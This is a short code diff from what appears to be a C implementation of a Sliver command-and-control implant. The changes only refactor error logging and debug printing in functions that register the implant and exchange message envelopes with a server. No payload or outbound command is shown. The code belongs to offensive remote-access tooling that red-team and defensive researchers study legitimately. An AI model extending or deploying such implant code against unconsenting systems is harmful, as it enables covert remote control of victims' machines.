@@ -99,7 +99,7 @@ PBYTE RegisterSliver
 	SecureZeroMemory(&OsVersion, sizeof(OsVersion));
 	OsVersion.dwOSVersionInfoSize = sizeof(OsVersion);
 	if (!GetOsVersion(&OsVersion)) {
-		LogError(L"ConvertSidToStringSidA failed at %s. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LOG_ERROR("GetOsVersion", GetLastError());
 		goto CLEANUP;
 	}
 
@@ -303,14 +303,14 @@ VOID SessionMainLoop
 			continue;
 		}
 
-		LogError(L"Receive Envelope:\n");
+		PrintFormatW(L"Receive Envelope:\n");
 		HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
 		pWrapper = ALLOC(sizeof(ENVELOPE_WRAPPER));
 		pWrapper->pSliverClient = pSliverClient;
 		pWrapper->pEnvelope = pEnvelope;
 		pWork = CreateThreadpoolWork((PTP_WORK_CALLBACK)MainHandler, pWrapper, &pSliverPool->CallBackEnviron);
 		if (pWork == NULL) {
-			LogError(L"CreateThreadpoolWork failed at %s. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+			LOG_ERROR("CreateThreadpoolWork", GetLastError());
 			goto CLEANUP;
 		}
 
@@ -344,11 +344,11 @@ BOOL WriteEnvelope
 	}
 
 	if (pEnvelope->pData != NULL) {
-		LogError(L"Write Envelope:\n");
+		PrintFormatW(L"Write Envelope:\n");
 		HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
 	}
 	else {
-		LogError(L"Write Envelope: []\n");
+		PrintFormatW(L"Write Envelope: []\n");
 	}
 
 	pMarshalledEnvelope = MarshalEnvelope(pEnvelope);
